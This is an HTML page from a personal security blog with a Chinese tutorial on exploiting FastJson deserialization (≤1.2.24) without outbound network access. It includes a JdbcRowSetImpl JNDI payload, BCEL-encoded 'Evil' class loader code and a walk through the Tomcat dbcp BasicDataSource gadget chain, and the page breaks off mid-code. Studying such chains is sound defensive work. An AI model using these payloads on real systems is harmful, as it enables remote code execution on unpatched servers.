@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      FastJson不出网利用 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">FastJson不出网利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-11-14 01:28:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    <b>#</b> Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/FastJson/" title="FastJson">
+                    <b>#</b> FastJson
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h4 id="本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet"><a class="markdownIt-Anchor" href="#本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet">#</a> 本文首发于 [奇安信攻防社区](<a target="_blank" rel="noopener" href="https://forum.butian.net/share/2040">奇安信攻防社区 - 浅析 FastJson 不出网利用方式 (butian.net)</a>)</h4>
+<h2 id="0x01-jndi利用"><a class="markdownIt-Anchor" href="#0x01-jndi利用">#</a> 0x01 JNDI 利用</h2>
+<p>JdbcRowSetImpl 中存在的 JNDI 注入</p>
+<p><img src="https://img-blog.csdnimg.cn/93eaa2726d884ec6a5b8dfb72e59a49a.png" alt="在这里插入图片描述"></p>
+<p>这里考虑 setAutoCommit</p>
+<p><img src="https://img-blog.csdnimg.cn/4b9c50f76fe841879af122aaa18b491d.png" alt="在这里插入图片描述"></p>
+<p>是个 set 方法</p>
+<p>参数是布尔类型的</p>
+<p><img src="https://img-blog.csdnimg.cn/331bf53417bb42e2a852350d9642db16.png" alt="在这里插入图片描述"></p>
+<p>使用 Yakit 生成一个反连</p>
+<p><img src="https://img-blog.csdnimg.cn/38b219d420654f538eb772a7cb5d9d9b.png" alt="在这里插入图片描述"></p>
+<p>构造 EXP</p>
+<p>首先类名是 <code>com.sun.rowset.JdbcRowSetImpl</code>  也就是 <code>@type</code>  的值</p>
+<p>接着是 <code>.lookup</code>  的参数 <code>DataSourceName</code>  也就是 rmi 或 ldap 的地址</p>
+<p>最后是 <code>AutoCommit</code>  布尔型的参数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZhALlpnN\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/888b395807634ba88d2f329ff055a537.png" alt="在这里插入图片描述"></p>
+<p>但是这种利用方式是需要出网的，并且有版本、依赖限制</p>
+<p>下面来看一个可以本地利用的</p>
+<h2 id="0x02-不出网利用"><a class="markdownIt-Anchor" href="#0x02-不出网利用">#</a> 0x02 不出网利用</h2>
+<p>fastjson≤1.2.24</p>
+<p>条件: <code>BasicDataSource</code>  只需要有 <code>dbcp</code>  或 <code>tomcat-dbcp</code>  的依赖即可，dbcp 即数据库连接池，在 java 中用于管理数据库连接，还是挺常见的。</p>
+<p>在 <code>ClassLoader</code>  存在一处 <code>loadclass</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>当类名是以 <code>$$BCEL$$</code>  开头，就会创建一个该类，并用 definclass 去调用</p>
+<p>BCEL 提供两个类， <code>Repository</code>  和 <code>Utility</code></p>
+<p><code>Repository</code>  用于将一个 <code>Java Class</code>  先转换成原生字节码，当然这里也可以直接使用 javac 命令来编译 java 文件生成字节码</p>
+<p><code>Utility</code>  用于将原生的字节码转换成 BCEL 格式的字节码</p>
+<p>其中 <code>createClass</code>  方法中</p>
+<p><img src="https://img-blog.csdnimg.cn/2dbcf13ac47149a0ab2a58d224e30927.png" alt="在这里插入图片描述"></p>
+<p>有一处解密，所以我们需要加密一下</p>
+<p>exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span> + encode, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        <span class="comment">//        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + encode).newInstance();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-利用链"><a class="markdownIt-Anchor" href="#0x03-利用链">#</a> 0x03 利用链</h2>
+<p>这次我们尝试以漏洞发现者的身份来看这条链子</p>
+<p>首先是 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot load JDBC driver class &#x27;&quot;</span> + driverClassName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                    logWriter.println(message);</span><br><span class="line">                    t.printStackTrace(logWriter);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (driverFromCCL == <span class="literal">null</span>) &#123;</span><br><span class="line">                    driverToUse = DriverManager.getDriver(url);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Usage of DriverManager is not possible, as it does not</span></span><br><span class="line">                    <span class="comment">// respect the ContextClassLoader</span></span><br><span class="line">                    <span class="comment">// N.B. This cast may cause ClassCastException which is handled below</span></span><br><span class="line">                    driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();</span><br><span class="line">                    <span class="keyword">if</span> (!driverToUse.acceptsURL(url)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;No suitable driver&quot;</span>, <span class="string">&quot;08001&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot create JDBC driver of class &#x27;&quot;</span></span><br><span class="line">                        + (driverClassName != <span class="literal">null</span> ? driverClassName : <span class="string">&quot;&quot;</span>) + <span class="string">&quot;&#x27; for connect URL &#x27;&quot;</span> + url + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                logWriter.println(message);</span><br><span class="line">                t.printStackTrace(logWriter);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set up the driver connection factory we will use</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> userName;</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;username&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> password;</span><br><span class="line">        <span class="keyword">if</span> (pwd != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;password&quot;</span>, pwd);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;password&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverConnectionFactory</span>(driverToUse, url,</span><br><span class="line">                connectionProperties);</span><br><span class="line">        <span class="keyword">return</span> driverConnectionFactory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>我们来看关键部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>
+<p>若存在 <code>driverClassLoader</code>  则会对类进行初始化</p>
+<p>这里的 <code>driverClassName</code>  和 <code>driverClassLoader</code>  都是可控的</p>
+<p>这里就可以考虑将 <code>driverClassLoader</code>  的参数写为 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
+<p>接着</p>
+<p>在 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource()</code>  中调用了 <code>createConnectionFactory()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Data source is closed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the pool if we have already created it</span></span><br><span class="line">        <span class="comment">// This is double-checked locking. This is safe since dataSource is</span></span><br><span class="line">        <span class="comment">// volatile and the code is targeted at Java 5 onwards.</span></span><br><span class="line">        <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            jmxRegister();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create factory which returns raw physical connections</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Set up the poolable connection factory</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            PoolableConnectionFactory poolableConnectionFactory;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                poolableConnectionFactory = createPoolableConnectionFactory(driverConnectionFactory);</span><br><span class="line">                poolableConnectionFactory.setPoolStatements(poolPreparedStatements);</span><br><span class="line">                poolableConnectionFactory.setMaxOpenPreparedStatements(maxOpenPreparedStatements);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating connection factory&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (success) &#123;</span><br><span class="line">                <span class="comment">// create a pool for our connections</span></span><br><span class="line">                createConnectionPool(poolableConnectionFactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create the pooling data source to manage connections</span></span><br><span class="line">            DataSource newDataSource;</span><br><span class="line">            success = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newDataSource = createDataSourceInstance();</span><br><span class="line">                newDataSource.setLogWriter(logWriter);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating datasource&quot;</span>, ex);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">                    closeConnectionPool();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If initialSize &gt; 0, preload the pool</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; initialSize; i++) &#123;</span><br><span class="line">                    connectionPool.addObject();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">                closeConnectionPool();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error preloading the connection pool&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If timeBetweenEvictionRunsMillis &gt; 0, start the pool&#x27;s evictor task</span></span><br><span class="line">            startPoolMaintenance();</span><br><span class="line"></span><br><span 